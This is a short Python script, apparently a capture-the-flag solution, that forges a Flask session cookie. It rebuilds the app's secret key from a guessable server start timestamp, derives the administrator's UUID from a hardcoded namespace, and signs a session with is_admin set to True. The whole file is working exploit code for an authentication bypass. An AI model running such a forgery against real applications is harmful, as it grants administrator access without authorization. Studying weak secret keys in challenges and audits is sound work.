from flask.sessions import SecureCookieSessionInterface
import hashlib
import uuid
from datetime import datetime

server_start_str = '20240923055027'
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()

secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
admin_uid = uuid.uuid5(secret, 'administrator')

session_data = {
    'username': 'administrator',
    'is_admin': True,
    'uid': str(admin_uid)
}

class MockApp:
    secret_key = secure_key

app = MockApp()

serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session_cookie = serializer.dumps(session_data)

print(f"Generated session cookie: {session_cookie}")